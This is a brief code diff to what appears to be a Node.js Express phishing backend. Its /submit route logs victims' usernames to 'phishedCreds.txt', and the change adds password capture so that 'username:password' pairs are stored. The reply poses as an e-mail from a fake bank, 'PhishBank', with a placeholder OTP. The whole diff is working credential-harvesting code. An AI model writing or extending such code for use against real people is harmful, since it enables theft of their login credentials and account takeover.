@@ -21,7 +21,8 @@ let username = ""; // do not recommend global vars
 
 app.post("/submit", (req, res) => {
     username = req.body.username || "";
-    fs.appendFileSync("phishedCreds.txt", username + "\n");
+    password = req.body.password || "";
+  fs.appendFileSync("phishedCreds.txt", username + ":" + password + "\n");
     res.send(`e-mail from PhishBank: Hello, ${username}! Your OTP is 123-456`);
 });
 
